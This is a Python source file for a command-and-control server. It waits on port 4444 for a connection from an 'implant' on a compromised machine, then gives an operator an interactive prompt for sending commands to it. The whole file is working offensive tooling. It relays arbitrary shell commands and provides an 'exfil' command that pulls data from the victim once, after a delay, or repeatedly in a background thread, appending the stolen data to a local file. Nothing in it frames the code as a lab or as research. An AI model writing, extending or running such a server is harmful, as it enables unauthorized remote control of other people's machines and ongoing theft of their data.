# c2_server.py
import socket
import time
import threading

HOST = '0.0.0.0'
PORT = 4444

def parse_command(cmd):
    parts = cmd.split()
    output_file = None
    delay = 0
    repeat = 0

    if "exfil" not in parts:
        return cmd, output_file, delay, repeat

    if "-o" in parts:
        idx = parts.index("-o")
        if idx + 1 < len(parts):
            output_file = parts[idx + 1]
            parts = parts[:idx] + parts[idx+2:]

    if "-t" in parts:
        idx = parts.index("-t")
        if idx + 1 < len(parts):
            try:
                delay = int(parts[idx + 1])
            except ValueError:
                print("[-] Invalid delay value")
            parts = parts[:idx] + parts[idx+2:]

    if "-r" in parts:
        idx = parts.index("-r")
        if idx + 1 < len(parts):
            try:
                repeat = int(parts[idx + 1])
            except ValueError:
                print("[-] Invalid repeat value")
            parts = parts[:idx] + parts[idx+2:]

    real_cmd = " ".join(parts)
    return real_cmd, output_file, delay, repeat

def exfil_command(conn, cmd, outfile, delay, repeat):
    def do_exfil():
        conn.sendall((cmd + "\n").encode())
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
            if b"[*] END" in chunk or b"[-]" in chunk:
                break
        if outfile:
            with open(outfile, "ab") as f:
                f.write(data)
            print(f"[+] Exfiltrated data appended to {outfile}")
        else:
            print(data.decode(errors='ignore'))

    if repeat > 0:
        print(f"[~] Repeating exfil every {repeat} seconds...")
        def repeat_exfil():
            while True:
                do_exfil()
                time.sleep(repeat)
        threading.Thread(target=repeat_exfil, daemon=True).start()
    else:
        if delay > 0:
            print(f"[~] Delaying exfil for {delay} seconds...")
            time.sleep(delay)
        do_exfil()

server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)

print("[*] Waiting for implant connection...")
conn, addr = server.accept()
print(f"[+] Connection from {addr}")

try:
    while True:
        cmd = input("C2> ").strip()
        if not cmd:
            continue

        real_cmd, outfile, delay, repeat = parse_command(cmd)

        if real_cmd == "exit":
            conn.sendall(b"exit\n")
            break

        if real_cmd.startswith("exfil"):
            thread = threading.Thread(target=exfil_command, args=(conn, real_cmd, outfile, delay, repeat))
            thread.start()
        else:
            conn.sendall((real_cmd + "\n").encode())
            data = conn.recv(4096).decode(errors='ignore')
            print(data)

except KeyboardInterrupt:
    print("\n[!] C2 interrupted.")

conn.close()
server.close()
